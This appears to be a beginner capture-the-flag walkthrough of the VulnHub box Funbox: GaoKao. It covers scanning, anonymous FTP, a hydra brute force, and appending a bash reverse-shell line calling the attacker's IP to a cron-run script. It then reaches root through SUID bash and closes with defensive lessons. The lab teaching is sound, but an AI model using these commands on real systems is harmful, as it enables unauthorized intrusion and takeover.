# Funbox: GaoKao — VulnHub Walkthrough (Beginner Friendly)

> The author (0815R2d2) calls it *"a box for beginners, but not easy"* and adds:
> *"Gather careful! Every brute-force attack at all ports can be stopped after
> 1500 tries per account. Enjoy the game and WYSIWYG!"* **WYSIWYG** ("what you
> see is what you get") is the core hint: the credentials you need are **sitting
> right in front of you** in server banners and files. Every step is explained.

| Field | Value |
| --- | --- |
| **Machine** | Funbox: GaoKao |
| **Difficulty** | Easy *(author: "for beginners, but not easy")* |
| **Author** | 0815R2d2 |
| **Released** | 6 June 2021 |
| **VulnHub Entry** | https://vulnhub.com/entry/funbox-gaokao,707/ |
| **Download** | https://vulnhub.com/entry/funbox-gaokao,707/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Debian/Ubuntu server) |

> **A note on brute force:** the box **rate-limits/terminates brute-force attacks
> after ~1500 attempts per account**. That is a *signpost*, not a roadblock — it
> tells you the password is a common one near the top of `rockyou.txt`, so a
> **short, targeted** list works.

---

## 0. What you will learn

- How to discover a host and scan its ports.
- How to read an **FTP banner** to harvest a **username** and hostname (WYSIWYG).
- How a **short, targeted `hydra` brute force** beats a blind one — and why the
  server's 1500-try limit matters.
- How anonymous/valid FTP access exposes a user's **home directory** and a
  **cron script**, and how to abuse a **writable, scheduled script** for a
  reverse shell.
- How a **SUID `bash`** misconfiguration gives instant root via GTFOBins.

**Prerequisites:** see [`docs/LAB-SETUP.md`](../../docs/LAB-SETUP.md) and
[`docs/TOOLS.md`](../../docs/TOOLS.md). Kali running, OVA imported, both VMs on
the same host-only network.

---

## 1. Reconnaissance — finding the target

> **Goal:** confirm the target's IP address on your isolated lab network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

```bash
# netdiscover is a nice alternative to arp-scan
sudo netdiscover -i eth0 -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
   192.168.56.10   08:00:27:aa:bb:cc   (Kali)
   192.168.56.101  08:00:27:11:22:33   (target)
```

**Target IP:** `192.168.56.101`

![netdiscover finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -v -T4 -A -p- -oN scans/allports 192.168.56.101
```

```text
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     ProFTPD 1.3.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh     OpenSSH 7.9 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp open  mysql   MySQL (unauthorized)
```

> **How to read it:** four attack surfaces — **FTP** (anonymous login allowed!),
> SSH, a web server, and **MySQL**. The FTP result is the strongest lead: an
> anonymous login often exposes files, and its **banner** may leak information.

![nmap scan](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Read the FTP banner — WYSIWYG

```bash
ftp 192.168.56.101
```

```text
Connected to 192.168.56.101.
220 (vsFTPd ... / ProFTPD ...) -------------- welcome to gaokao ----------------------------------
Name (192.168.56.101:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.          <-- anonymous works
```

> **Why it works:** the server **banner** often carries a greeting, a hostname,
> or a potential **username**. Here it hands you a likely account (**`sky`**) and
> the machine's hostname — that is the "what you see is what you get" hint.

```bash
# Optional: make the hostname resolve too
echo "192.168.56.101  gaokao" | sudo tee -a /etc/hosts
```

### 3.2 Targeted brute force (mind the 1500-try limit)

```bash
hydra -V -l sky -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.101
```

```text
[21][ftp] host: 192.168.56.101   login: sky   password: <found early in rockyou>
```

> **Why it works:** the password is a common word near the **top** of
> `rockyou.txt`, so `hydra` finds it long before the server's **~1500 attempt**
> cutoff. A blind, full-list attack against an unknown user would trip the limit
> first — this is exactly what the author's warning is about.

### 3.3 Browse the FTP home directory

```bash
ftp 192.168.56.101
# login as sky
pwd
ls -la
cd ..
ls -la
```

```text
230 Login successful.
Remote system type is UNIX.
230-   /home/sky
-rw-r--r--  ... user.flag
drwxr-xr-x  ... lucy
drwxr-xr-x  ... sarah
```

> **How to read it:** logging in as `sky` drops us **inside `/home/sky`**. One
> directory up we discover two other accounts: **`lucy`** and **`sarah`**. (Their
> passwords are also crackable, and `sky`'s password may even work for MySQL —
> both are rabbit holes. Stay focused on `user.flag`.)

### 3.4 The writable, scheduled script — the real foothold

`user.flag` is not just a flag: it is a **shell script owned and executed by
`sarah`**, which strongly implies **a cron job runs it**.

```bash
cat user.flag
```

```text
#!/bin/bash
# ... some maintenance task ...
```

> **Why it works:** a file in `sky`'s home that is owned by `sarah` and looks like
> a task script means **cron runs it as `sarah`**. If we can *write* to it (FTP
> lets us), we can make `sarah` run *our* code.

Download it, append a reverse shell, and upload it back:

```bash
# On Kali
wget -r ftp://sky:<password>@192.168.56.101/user.flag      # or use the ftp client
# append a connect-back line:
printf '\n/bin/bash -i >& /dev/tcp/192.168.56.10/4444 0>&1\n' >> user.flag
```

```bash
# start a listener
nc -lvnp 4444

# upload the modified script back over FTP
ftp 192.168.56.101
# login as sky, then:
put user.flag
ls -la                       # check permissions are unchanged
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 47832
sarah@gaokao:~$
```

> **Why it works:** the FTP server preserves file ownership/permissions on
> upload (and `SITE` commands are available if you need to fix them). Cron then
> executes the script — and our appended line — as **`sarah`**.

Upgrade the shell to a full TTY if `python` isn't available:

```bash
SHELL=/bin/bash script -q /dev/null
export TERM=xterm
```

![FTP cron abuse to reverse shell](images/03-foothold.png)

### 3.5 The user flag

```bash
cat ~/user.flag
```

```text
# the user flag; content varies by build
```

---

## 4. Privilege escalation — becoming root

### 4.1 Find SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
...
/bin/bash          <-- bash with the SUID bit set!
```

> **How to read it:** `bash` should **never** be SUID. When a binary that can run
> commands has the SUID bit and is owned by `root`, you can use it to run commands
> as `root`. This is a textbook misconfiguration.

### 4.2 Exploit it (GTFOBins)

```bash
bash -p
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1000(sarah)
```

> **Why it works:** `-p` tells bash to **preserve the effective UID**, which the
> SUID bit set to `root`. So the shell is `root`. Documented on
> [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/).

### The root flag

```bash
cd /root
cat root.flag
```

```text
# the root flag; content varies by build
```

![SUID bash to root](images/04-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Anonymous FTP + verbose banner leak | FTP :21 | Username/hostname disclosure |
| 2 | Weak, guessable FTP password | `sky` account | FTP access; exposes `/home` |
| 3 | Writable script executed by cron | `~sky/user.flag` (as `sarah`) | Shell as `sarah` |
| 4 | SUID bit set on `bash` | `/bin/bash` | Instant Privilege Escalation to `root` |
| 5 | Credential reuse / MySQL exposure | `sky` ↔ MySQL :3306 | Lateral movement (rabbit hole) |

## 6. Defensive lessons (blue team)

- **Disable anonymous FTP.** It should be off unless explicitly required, and
  FTP should be replaced by SFTP/FTPS entirely.
- **Trim verbose banners.** Do not advertise hostnames, usernames, or greetings
  over network services.
- **Never make scheduled scripts writable by unrelated users.** Cron scripts must
  be `root`-owned and non-writable; run jobs as least-privilege accounts.
- **Audit SUID/SGID binaries.** `find / -perm -4000` should never list a shell or
  interpreter. Remove the SUID bit from anything that doesn't need it.
- **Rate-limit / lock out authentication.** The 1500-try cap helps, but combined
  with strong passwords and key-only SSH it becomes a wall.
- **Don't reuse credentials across services.** One FTP password must not unlock
  MySQL or an OS account.
- **Detection:** FIM on cron scripts, alerts on new SUID binaries, and monitoring
  for unexpected outbound connections from a file server.

---

## 7. References

- VulnHub entry: https://vulnhub.com/entry/funbox-gaokao,707/
- GTFOBins — bash: https://gtfobins.github.io/gtfobins/bash/
- Hydra (THC): https://github.com/vanhauser-thc/thc-hydra
- Community writeups consulted:
  - [Funbox Gaokao Walkthrough (NepCodeX)](https://nepcodex.com/2021/06/funbox-gaokao-walkthrough-vulnhub-writeup/)
  - [Funbox ~ VulnHub (series)](https://www.vulnhub.com/series/funbox,341)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `netdiscover`
- [ ] `images/02-nmap.png` — nmap showing FTP/SSH/HTTP/MySQL
- [ ] `images/03-foothold.png` — FTP banner, `user.flag`, and the cron shell
- [ ] `images/04-root-flag.png` — SUID `bash -p` and `cat /root/root.flag`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md)._
